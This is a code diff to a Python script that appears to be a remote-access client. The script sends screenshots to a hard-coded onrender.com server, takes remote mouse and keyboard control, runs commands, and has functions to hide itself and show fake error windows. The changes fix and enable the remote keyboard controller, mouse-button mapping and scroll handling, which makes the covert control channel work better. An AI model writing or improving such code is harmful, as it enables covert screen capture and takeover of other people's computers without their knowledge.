@@ -16,7 +16,8 @@ import time
 import httpx
 import asyncio
 import keyboard
-from pyautogui import size
+from pyautogui import size 
+import pyautogui
 from mss import mss
 import pynput
 url = "https://ms32-sha2.onrender.com/"
@@ -107,6 +108,7 @@ def playfunc(fp):
         log(f"Done Played {fp}")
     except Exception as e:
         log(f"Audio thread error: \t{e}",state="WARN")
+
 def update():
     try:
         global terminate
@@ -142,7 +144,6 @@ def update():
         return
     except Exception as e:
         log(f"Updating thread error: \t{e}",state="WARN")
-
 
 def hide(state):
     try:
@@ -262,6 +263,7 @@ def display(fp:str):
         log("Started imshow.exe, llikely image showing")
     except Exception as e:
         log(f"Display thread error occured:\t{e}",state="WARN")
+
 def flip():
     global sstate
     try:
@@ -284,6 +286,7 @@ def runcmd(cmd):
         return True
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
+
 def showerr(num):
     try:
         if not os.path.exists("error.exe"):
@@ -319,7 +322,7 @@ def share():
                     ss.rgb)
                 # ss.save(buffer, format="JPEG",quality=40)
                 buffer = BytesIO()
-                img.save(buffer,format="JPEG",quality=80)
+                img.save(buffer,format="JPEG")
                 buffer.seek(0)
                 # img = base64.b64encode(buffer.getvalue())
                 rq.post(url+"screenshot", data=buffer.read())
@@ -332,8 +335,7 @@ def share():
 
 def control():
     global sharing
-    
-        # controller = pynput.keyboard.Controller()
+    controller = pynput.keyboard.Controller()
         # async with httpx.AsyncClient() as client:
     while sharing:
         try:
@@ -348,9 +350,9 @@ def control():
                 if data["mouse"] == 0:
                     click()
                 elif data["mouse"] == 1:        
-                    click(button="right")
-                elif data["mouse"] == 2:
                     click(button="middle")
+                elif data["mouse"] == 2:
+                    click(button="right")
             elif data and data["type"] == "key" and data["btn"]:
                 #{"btn":[17,65],"type":"key"}
                 btns = []
@@ -358,9 +360,9 @@ def control():
                     btns.append(chr(key)) if type(key) == int else btns.append(key)
                 keys = "+".join(btns)
                 print(keys)
-                keyboard.send(keys)
+                keyboard.send(keys.lower())
             elif data and data["type"] == "scroll":                                    
-                wheel(delta=data["deltaY"])
+                wheel(delta=-(data["deltaY"]))
 
             elif data and data["type"] == "dbclick":
                 x = data["x"]*(width/data["width"])
@@ -368,6 +370,7 @@ def control():
                 move(x,y)
                 double_click()
         except httpx.ConnectTimeout:continue
+        except ValueError:continue
             
 def main():
     global sstate
@@ -433,5 +436,5 @@ def main():
         except Exception as e:
             log(f"Main thread error occured:\t{e}",state="WARN")
     log("Shutting down",state="OFFLINE")
-main()
-    
+
+main()  
